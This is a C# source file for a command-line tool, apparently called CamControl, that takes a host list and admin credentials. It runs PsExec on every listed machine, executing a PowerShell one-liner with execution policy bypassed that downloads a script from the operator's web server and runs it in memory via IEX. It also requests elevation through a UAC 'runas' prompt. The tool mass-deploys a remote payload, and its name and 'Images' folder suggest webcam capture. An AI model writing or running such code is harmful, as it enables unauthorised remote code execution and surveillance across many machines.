using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Security.Principal;
using System.Management;




namespace CamControl
{
    class PsExecResult
    {
        public Int32 ExitCode { get; set; }
        public String Result { get; set; }
    }

    class Program
    {
        static void ShowBanner()
        {
            Console.WriteLine("Utilization: CamControl.exe host_files local_ip local_port username password");

        }

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
            System.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();
            DirectoryInfo dir = new DirectoryInfo(Path.Combine(Path.GetDirectoryName(asm.Location), "Images"));
            if (!dir.Exists)
                dir.Create();

            if (args.Length < 4)
            {
                ShowBanner();
                return;
            }


            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);

            if (!hasAdministrativeRight)
            {
                string parameter = String.Join(" ", args);
                RunElevated(asm.Location, parameter);
                Process.GetCurrentProcess().Kill();
            }


            String filename = args[0];
            try
            {
                if (!File.Exists(filename)) throw new Exception("");
            }
            catch {
                Console.WriteLine("File Not found!\r\n");
                ShowBanner();
                return;
            }

            IPAddress localIP = IPAddress.Loopback;
            try
            {
                localIP = IPAddress.Parse(args[1]);
                
            }
            catch {
                Console.WriteLine("Invalid IP\r\n");
                ShowBanner();
                return;
            }


            Int16 port = 8080;
            try
            {
                port = Int16.Parse(args[2]);

            }
            catch
            {
                Console.WriteLine("Invalid Port\r\n");
                ShowBanner();
                return;
            }

            String username = args[3];
            String password = args[4];

            WebServer server = new WebServer(port);

            System.IO.StreamReader file = new System.IO.StreamReader(filename);
            String line = "";
            while ((line = file.ReadLine()) != null)
            {
                List<IPAddress> ips = new List<IPAddress>();
                
                try
                {
                    IPAddress ip = IPAddress.Parse(line);
                    ips.Add(ip);
                }
                catch {
                    //Não é um IP, tenta resolver
                    try
                    {
                        ips.AddRange( Dns.GetHostAddresses(line));
                    }
                    catch { }
                }

                if ((ips == null) || (ips.Count == 0))
                {
                    Console.WriteLine("Could not resolve name to IP from name " + line);
                    continue;
                }

                foreach (IPAddress ip in ips)
                {

                    String lUser = username;


                    if (lUser.IndexOf("\\") == -1)
                        lUser = ".\\" + username;

                    Console.WriteLine("Running psexec on " + line + " (" + ip.ToString() + ")");

                    PsExec(ip, lUser, password, "powershell.exe -exec bypass -Command IEX (New-Object system.Net.WebClient).DownloadString('http://" + localIP.ToString() + ":" + port + "/" + server.InstanceId + "');");

                }
            }

            file.Close();

            Console.WriteLine("Press ENTER to finish");
            Console.ReadLine();

            Process.GetCurrentProcess().Kill();
        }

        static void PsExec(IPAddress host, String username, String password, String cmd)
        {
            System.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();
            String path = Path.GetDirectoryName(asm.Location);

            PsExecResult r = new PsExecResult();

            Process p = new Process();
            p.StartInfo.UseShellExecute = true;
            //p.StartInfo.RedirectStandardOutput = true;
            //p.StartInfo.RedirectStandardError = true;
            p.StartInfo.FileName = Path.Combine(path, "PsExec.exe");
            p.StartInfo.Arguments = "\\\\" + host.ToString() + " -u \"" + username + "\" -p \"" + password + "\" -accepteula " + cmd;
            //p.StartInfo.Arguments = "\\\\localhost -nobanner -accepteula cmd /c ipconfig";
            p.Start();

            //Console.WriteLine(p.StartInfo.Arguments);
            
            p.WaitForExit(30000);
        }


        private static bool RunElevated(string fileName, String arguments)
        {

#if DEBUG
            Console.WriteLine("Runnind elavated: " + arguments);
#endif

            //MessageBox.Show("Run: " + fileName);
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.UseShellExecute = true;
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            processInfo.Arguments = arguments;
            try
            {
                Process p = Process.Start(processInfo);
                p.WaitForExit();
                return true;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                //Do nothing. Probably the user canceled the UAC window
            }
            return false;
        }


        static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            UnhandledException.WriteEvent(sender, e, true);
        }

    }
}
